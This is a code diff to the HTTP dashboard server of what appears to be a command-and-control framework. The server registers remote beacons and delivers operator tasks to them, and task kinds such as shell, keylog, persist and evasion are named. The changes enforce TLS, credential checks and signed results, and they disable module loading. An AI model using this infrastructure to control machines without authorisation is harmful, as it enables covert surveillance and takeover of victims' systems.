@@ -1,9 +1,34 @@
 // server/src/http/DashboardHttpServer.ts
 import type { Octokit } from '@octokit/rest';
 import type { BeaconRegistry } from '../BeaconRegistry.ts';
-import type { TaskQueue, TaskKind, QueuedTask } from '../TaskQueue.ts';
-import type { ModuleStore } from './ModuleStore.ts';
-import { OidcRoutes } from './OidcRoutes.ts';
+import type { TaskQueue, QueuedTask } from '../TaskQueue.ts';
+import {
+  OidcRoutes,
+  type OidcBeaconBinding,
+} from './OidcRoutes.ts';
+import type {
+  CredentialSession,
+  CredentialVerifier,
+} from '../services/CredentialVerifier.ts';
+import {
+  checkinAuthorizesTaskDelivery,
+  type BeaconIdentityService,
+} from '../services/BeaconIdentityService.ts';
+import type { TaskService } from '../services/TaskService.ts';
+import type { OctoStore } from '../store/index.ts';
+import type { CheckinPayload, TaskResult as TaskResultPayload } from '@octoc2/shared';
+import {
+  TASK_KINDS,
+  isChannelKind,
+  isSelectableChannel,
+  validateTaskArgs,
+  type ChannelKind,
+  type TaskKind,
+} from '@octoc2/shared';
+
+interface BeaconSocketData {
+  credential: CredentialSession;
+}
 
 interface GitHubConfig {
   octokit: Octokit;
@@ -11,25 +36,17 @@ interface GitHubConfig {
   repo:    string;
 }
 
-interface CheckinPayload {
-  beaconId:  string;
-  publicKey: string;
-  hostname:  string;
-  username:  string;
-  os:        string;
-  arch:      string;
-  pid:       number;
-  checkinAt: string;
+export interface OidcHttpConfig {
+  store: OctoStore;
+  operatorPublicKey: Uint8Array;
+  operatorSecretKey: Uint8Array;
+  bindings: readonly OidcBeaconBinding[];
+  audience?: string;
 }
 
-interface TaskResultPayload {
-  taskId:      string;
-  beaconId:    string;
-  success:     boolean;
-  output:      string;
-  data?:       string;
-  completedAt: string;
-  signature?:  string;
+export interface HttpTlsConfig {
+  cert: string | Buffer;
+  key: string | Buffer;
 }
 
 interface Task {
@@ -41,10 +58,8 @@ interface Task {
   preferredChannel?: string;
 }
 
-const VALID_KINDS = new Set<TaskKind>([
-  'shell', 'upload', 'download', 'screenshot', 'keylog',
-  'persist', 'unpersist', 'sleep', 'die', 'load-module', 'ping', 'evasion',
-]);
+const VALID_KINDS = new Set<TaskKind>(TASK_KINDS);
+const DIRECT_DELIVERY_LEASE_MS = 5 * 60_000;
 
 const STATUS_MAP: Record<string, 'active' | 'stale' | 'dead'> = {
   active:  'active',
@@ -53,26 +68,47 @@ const STATUS_MAP: Record<string, 'active' | 'stale' | 'dead'> = {
 };
 
 export class DashboardHttpServer {
-  private server: ReturnType<typeof Bun.serve> | null = null;
+  private server: ReturnType<typeof Bun.serve<BeaconSocketData>> | null = null;
   private readonly oidcRoutes: OidcRoutes | null;
 
   constructor(
     private readonly registry: BeaconRegistry,
     private readonly queue: TaskQueue,
-    private readonly token: string,
-    private readonly moduleStore: ModuleStore,
+    private readonly operatorCredentials: CredentialVerifier,
+    private readonly beaconCredentials: CredentialVerifier,
+    private readonly identities: BeaconIdentityService,
+    private readonly tasks: TaskService,
     private readonly githubConfig?: GitHubConfig,
-    operatorSecretKey?: Uint8Array,
+    oidcConfig?: OidcHttpConfig,
   ) {
-    this.oidcRoutes = operatorSecretKey
-      ? new OidcRoutes({ registry, taskQueue: queue, operatorSecretKey })
+    this.oidcRoutes = oidcConfig
+      ? new OidcRoutes({
+          registry,
+          taskQueue: queue,
+          identities,
+          tasks,
+          store: oidcConfig.store,
+          operatorPublicKey: oidcConfig.operatorPublicKey,
+          operatorSecretKey: oidcConfig.operatorSecretKey,
+          bindings: oidcConfig.bindings,
+          ...(oidcConfig.audience && { audience: oidcConfig.audience }),
+        })
       : null;
   }
 
   /** Starts the server. Pass port=0 to let the OS pick a free port. */
-  start(port: number): number {
+  start(
+    port: number,
+    hostname = '127.0.0.1',
+    tls: HttpTlsConfig,
+  ): number {
+    if (!tls.cert || !tls.key) {
+      throw new Error('HTTP TLS certificate and private key are required');
+    }
     this.server = Bun.serve({
       port,
+      hostname,
+      tls,
       idleTimeout: 0, // disable — SSE streams and WS connections must not time out
       fetch: (req, server) => this.handle(req, server),
       websocket: {
@@ -81,7 +117,12 @@ export class DashboardHttpServer {
         close:   (ws) => this.wsClose(ws),
       },
     });
-    console.log(`[HTTP] Dashboard API listening on port ${this.server.port}`);
+    if (this.server.protocol !== 'https') {
+      this.server.stop(true);
+      this.server = null;
+      throw new Error('Dashboard API refused to start without TLS');
+    }
+    console.log(`[HTTP] Dashboard API listening with TLS on port ${this.server.port}`);
     return this.server.port ?? 0;
   }
 
@@ -130,12 +171,15 @@ export class DashboardHttpServer {
 
       // WebSocket upgrade for beacon channel
       if (req.method === 'GET' && pathname === '/ws') {
-        const url      = new URL(req.url);
-        const wsToken  = url.searchParams.get('token') ?? '';
-        if (wsToken !== this.token) {
+        const credential = this.beaconCredentials.authenticateHeadersSession(
+          req.headers,
+        );
+        if (!credential) {
           return this.err('unauthorized', 401);
         }
-        const upgraded = (server as Bun.Server<undefined>).upgrade(req);
+        const upgraded = (server as Bun.Server<BeaconSocketData>).upgrade(req, {
+          data: { credential },
+        });
         if (upgraded) return undefined as unknown as Response;
         return this.err('WebSocket upgrade failed', 400);
       }
@@ -146,19 +190,27 @@ export class DashboardHttpServer {
         if (oidcResp) return oidcResp;
       }
 
-      const auth = req.headers.get('Authorization') ?? '';
-      if (!auth.startsWith('Bearer ') || auth.slice(7) !== this.token) {
+      const beaconRoute = pathname === '/api/beacon/checkin' || pathname === '/api/beacon/submit-result';
+      let beaconPrincipal: string | null = null;
+      if (beaconRoute) {
+        beaconPrincipal = this.beaconCredentials.authenticateHeaders(req.headers);
+        if (!beaconPrincipal) return this.err('unauthorized', 401);
+      } else if (!this.operatorCredentials.authenticateHeaders(req.headers)) {
         return this.err('unauthorized', 401);
       }
 
-      return this.route(req, pathname);
+      return this.route(req, pathname, beaconPrincipal);
     } catch (err) {
       console.error('[HTTP] Unhandled error:', err);
       return this.err('internal server error', 500);
     }
   }
 
-  private async route(req: Request, pathname: string): Promise<Response> {
+  private async route(
+    req: Request,
+    pathname: string,
+    beaconPrincipal: string | null,
+  ): Promise<Response> {
     if (req.method === 'GET' && pathname === '/api/beacons') {
       return this.getBeacons();
     }
@@ -175,18 +227,12 @@ export class DashboardHttpServer {
 
     const moduleMatch = pathname.match(/^\/api\/modules\/([^/]+)\/([^/]+)$/);
     if (moduleMatch) {
-      const [, beaconId, name] = moduleMatch as [string, string, string];
-      if (req.method === 'POST') {
-        return this.handleModuleUpload(req, beaconId, name);
-      }
-      if (req.method === 'GET') {
-        return this.handleModuleDownload(beaconId, name);
-      }
+      return this.err('module loading is disabled', 410);
     }
 
     const moduleListMatch = pathname.match(/^\/api\/beacon\/([^/]+)\/modules$/);
     if (req.method === 'GET' && moduleListMatch) {
-      return this.getModuleList(moduleListMatch[1]!);
+      return this.err('module loading is disabled', 410);
     }
 
     const maintenanceMatch = pathname.match(/^\/api\/beacon\/([^/]+)\/maintenance$/);
@@ -199,11 +245,11 @@ export class DashboardHttpServer {
     }
 
     if (req.method === 'POST' && pathname === '/api/beacon/checkin') {
-      return this.beaconCheckin(req);
+      return this.beaconCheckin(req, beaconPrincipal!);
     }
 
     if (req.method === 'POST' && pathname === '/api/beacon/submit-result') {
-      return this.beaconSubmitResult(req);
+      return this.beaconSubmitResult(req, beaconPrincipal!);
     }
 
     return this.err('not found', 404);
@@ -211,23 +257,45 @@ export class DashboardHttpServer {
 
   // ── WebSocket lifecycle ─────────────────────────────────────────────────────
 
-  private wsOpen(_ws: Bun.ServerWebSocket<unknown>): void {
+  private wsOpen(_ws: Bun.ServerWebSocket<BeaconSocketData>): void {
     // nothing needed on open
   }
 
   private async wsMessage(
-    ws: Bun.ServerWebSocket<unknown>,
+    ws: Bun.ServerWebSocket<BeaconSocketData>,
     msg: string | Buffer,
   ): Promise<void> {
+    let credentialActive = false;
+    try {
+      credentialActive = this.beaconCredentials.isSessionActive(
+        ws.data.credential,
+      );
+    } catch {
+      // Store failures must not leave a long-lived authenticated channel open.
+    }
+    if (!credentialActive) {
+      const message = 'credential expired or revoked';
+      ws.send(JSON.stringify({ type: 'error', message }));
+      ws.close(1008, message);
+      return;
+    }
+
     try {
       const text   = typeof msg === 'string' ? msg : msg.toString('utf8');
       const parsed = JSON.parse(text) as { type: string; payload?: unknown; result?: unknown };
+      const beaconId = ws.data.credential.principal;
 
       if (parsed.type === 'checkin') {
-        const tasks = await this.handleCheckinPayload(parsed.payload as CheckinPayload);
+        const tasks = await this.handleCheckinPayload(
+          parsed.payload as CheckinPayload,
+          beaconId,
+        );
         ws.send(JSON.stringify({ type: 'checkin-response', tasks }));
       } else if (parsed.type === 'submit-result') {
-        await this.handleSubmitResult(parsed.result as TaskResultPayload);
+        await this.handleSubmitResult(
+          parsed.result as TaskResultPayload,
+          beaconId,
+        );
         ws.send(JSON.stringify({ type: 'result-accepted' }));
       } else {
         ws.send(JSON.stringify({ type: 'error', message: 'unknown message type' }));
@@ -237,81 +305,122 @@ export class DashboardHttpServer {
     }
   }
 
-  private wsClose(_ws: Bun.ServerWebSocket<unknown>): void {
+  private wsClose(_ws: Bun.ServerWebSocket<BeaconSocketData>): void {
     // nothing needed on close
   }
 
   // ── Shared beacon business logic ────────────────────────────────────────────
 
-  private async handleCheckinPayload(payload: CheckinPayload): Promise<Task[]> {
-    // Upsert beacon: if known, update lastSeen; otherwise register with issueNumber 0
-    const existing = this.registry.get(payload.beaconId);
-    if (existing) {
-      this.registry.updateLastSeen(payload.beaconId, existing.lastSeq);
-    } else {
-      this.registry.register({
-        beaconId:    payload.beaconId,
-        issueNumber: 0,
-        publicKey:   payload.publicKey,
-        hostname:    payload.hostname,
-        username:    payload.username,
-        os:          payload.os,
-        arch:        payload.arch,
-        seq:         0,
-        tentacleId:  13,  // T13 — HTTP/WebSocket direct channel
-      });
+  private async handleCheckinPayload(
+    payload: CheckinPayload,
+    authenticatedBeaconId: string,
+  ): Promise<Task[]> {
+    if (payload.beaconId !== authenticatedBeaconId) {
+      throw new Error('credential does not match beaconId');
     }
-    // Always track that this checkin arrived via the HTTP/WebSocket channel
-    this.registry.updateActiveTentacle(payload.beaconId, 13);
-
-    // Get pending tasks and mark them delivered
-    const pending = this.queue.getPendingTasks(payload.beaconId);
-    for (const task of pending) {
-      this.queue.markDelivered(task.taskId);
+    const status = await this.identities.verifyAndRegisterCheckin(
+      payload,
+      authenticatedBeaconId,
+      13,
+      this.registry.get(payload.beaconId)?.issueNumber ?? 0,
+    );
+    const deliveries = checkinAuthorizesTaskDelivery(status)
+      ? this.queue.claimDeliveries(
+        payload.beaconId,
+        "http",
+        DIRECT_DELIVERY_LEASE_MS,
+      )
+      : [];
+    try {
+      const response = deliveries.map(({ task }: {
+        task: QueuedTask;
+      }): Task => ({
+        taskId: task.taskId,
+        kind: task.kind,
+        args: task.args,
+        ref: task.ref,
+        issuedAt: task.createdAt,
+        ...(task.preferredChannel !== undefined && {
+          preferredChannel: task.preferredChannel,
+        }),
+      }));
+      this.queue.finishDeliveries(deliveries, "delivered");
+      return response;
+    } catch (error) {
+      this.queue.finishDeliveries(
+        deliveries,
+        "transient_failure",
+        error,
+      );
+      throw error;
     }
 
-    // Return task shape expected by the beacon
-    return pending.map((t: QueuedTask): Task => ({
-      taskId:           t.taskId,
-      kind:             t.kind,
-      args:             t.args,
-      ref:              t.ref,
-      issuedAt:         t.createdAt,
-      ...(t.preferredChannel !== undefined && { preferredChannel: t.preferredChannel }),
-    }));
   }
 
-  private async handleSubmitResult(result: TaskResultPayload): Promise<void> {
-    const resultJson = JSON.stringify({
-      success:     result.success,
-      output:      result.output,
-      data:        result.data ?? '',
-      completedAt: result.completedAt,
-      signature:   result.signature ?? '',
-    });
-    this.queue.markCompleted(result.taskId, resultJson);
+  private async handleSubmitResult(
+    result: TaskResultPayload,
+    authenticatedBeaconId: string,
+  ): Promise<"completed" | "duplicate"> {
+    if (result.beaconId !== authenticatedBeaconId) {
+      throw new Error("credential does not match beaconId");
+    }
+    const verified = await this.tasks.acceptSignedResult(
+      result,
+      authenticatedBeaconId,
+    );
+    if (verified.status === "completed") return "completed";
+    if (verified.status === "exact_duplicate") return "duplicate";
+    if (verified.status === "owner_mismatch") {
+      throw new Error("task belongs to another beacon");
+    }
+    if (
+      verified.status === "conflicting_duplicate" ||
+      verified.status === "conflicting_message"
+    ) {
+      throw new Error("conflicting duplicate result");
+    }
+    if (
+      verified.status === "invalid_signature" ||
+      verified.status === "identity_key_mismatch"
+    ) {
+      throw new Error("invalid result signature");
+    }
+    throw new Error("task not found or no longer accepts results");
+
   }
 
-  private async beaconCheckin(req: Request): Promise<Response> {
+  private async beaconCheckin(req: Request, authenticatedBeaconId: string): Promise<Response> {
     let payload: CheckinPayload;
     try {
       payload = await req.json() as CheckinPayload;
     } catch {
       return this.err('invalid JSON', 400);
     }
-    const tasks = await this.handleCheckinPayload(payload);
-    return this.json({ tasks });
+    try {
+      const tasks = await this.handleCheckinPayload(payload, authenticatedBeaconId);
+      return this.json({ tasks });
+    } catch (err) {
+      return this.err((err as Error).message, 403);
+    }
   }
 
-  private async beaconSubmitResult(req: Request): Promise<Response> {
+  private async beaconSubmitResult(req: Request, authenticatedBeaconId: string): Promise<Response> {
     let result: TaskResultPayload;
     try {
       result = await req.json() as TaskResultPayload;
     } catch {
       return this.err('invalid JSON', 400);
     }
-    await this.handleSubmitResult(result);
-    return this.json({ accepted: true });
+    try {
+      const outcome = await this.handleSubmitResult(result, authenticatedBeaconId);
+      return this.json({ accepted: true, duplicate: outcome === "duplicate" });
+    } catch (err) {
+      const message = (err as Error).message;
+      if (message.includes("another beacon")) return this.err(message, 403);
+      if (message.includes("signature")) return this.err(message, 403);
+      if (message.includes("conflicting")) return this.err(message, 409);
+      return this.err(message, 404);
+    }
   }
 
   // ── Operator REST handlers ───────────────────────────────────────────────────
@@ -350,15 +459,32 @@ export class DashboardHttpServer {
     if (!body.args || typeof body.args !== 'object' || Array.isArray(body.args)) {
       return this.err('args must be an object', 400);
     }
+    const validation = validateTaskArgs(
+      body.kind as TaskKind,
+      body.args,
+    );
+    if (!validation.ok) {
+      return this.err(
+        validation.issues.map((issue) => issue.message).join('; '),
+        400,
+      );
+    }
 
-    const preferredChannel = typeof body.preferredChannel === 'string'
-      ? body.preferredChannel
-      : undefined;
+    let preferredChannel: ChannelKind | undefined;
+    if (body.preferredChannel !== undefined) {
+      if (
+        !isChannelKind(body.preferredChannel) ||
+        !isSelectableChannel(body.preferredChannel)
+      ) {
+        return this.err('preferredChannel must be a selectable channel kind', 400);
+      }
+      preferredChannel = body.preferredChannel;
+    }
 
     const task = this.queue.queueTask(
       beaconId,
       body.kind as TaskKind,
-      body.args as Record<string, unknown>,
+      validation.value as Record<string, unknown>,
       preferredChannel,
     );
     return this.json({
@@ -390,28 +516,6 @@ export class DashboardHttpServer {
         result:      t.result ? (() => { try { return JSON.parse(t.result!) as unknown; } catch { return t.result; } })() : null,
       }));
     return this.json(tasks);
-  }
-
-  private async getModuleList(beaconId: string): Promise<Response> {
-    const names    = await this.moduleStore.list(beaconId);
-    const allTasks = this.queue.getAllTasks(beaconId);
-
-    const result = names.map(name => {
-      const lastTask = allTasks
-        .filter(t =>
-          t.kind === 'load-module' &&
-          (t.args as Record<string, unknown>)['name'] === name &&
-          t.state === 'completed' &&
-          t.completedAt !== null
-        )
-        .sort((a, b) =>
-          new Date(b.completedAt!).getTime() - new Date(a.completedAt!).getTime()
-        )[0];
-
-      return { name, lastExecuted: lastTask?.completedAt ?? null };
-    });
-
-    return this.json(result);
   }
 
   private async getMaintenance(beaconId: string): Promise<Response> {
@@ -467,29 +571,6 @@ export class DashboardHttpServer {
     });
   }
 
-  private async handleModuleUpload(
-    req: Request,
-    beaconId: string,
-    name: string,
-  ): Promise<Response> {
-    const MODULE_NAME_RE = /^[a-zA-Z0-9_-]{1,64}$/;
-    if (!MODULE_NAME_RE.test(name)) {
-      return this.err('invalid module name', 400);
-    }
-
-    if (!this.registry.get(beaconId)) {
-      return this.err('beacon not found', 404);
-    }
-
-    const bytes = new Uint8Array(await req.arrayBuffer());
-    if (bytes.length === 0) {
-      return this.err('empty body', 400);
-    }
-
-    await this.moduleStore.store(beaconId, name, bytes);
-    return this.json({ beaconId, name, bytes: bytes.length }, 201);
-  }
-
   private getEvents(): Response {
     let intervalId: ReturnType<typeof setInterval> | null = null;
     const registry = this.registry;
@@ -536,26 +617,4 @@ export class DashboardHttpServer {
     });
   }
 
-  private async handleModuleDownload(beaconId: string, name: string): Promise<Response> {
-    const MODULE_NAME_RE = /^[a-zA-Z0-9_-]{1,64}$/;
-    if (!MODULE_NAME_RE.test(name)) {
-      return this.err('invalid module name', 400);
-    }
-
-    const data = await this.moduleStore.fetch(beaconId, name);
-    if (!data) {
-      return this.err('module not found', 404);
-    }
-
-    return new Response(data, {
-      status: 200,
-      headers: {
-        'Content-Type':                'application/octet-stream',
-        'Content-Length':              String(data.length),
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-        'Access-Control-Allow-Headers': 'Authorization, Content-Type',
-      },
-    });
-  }
 }
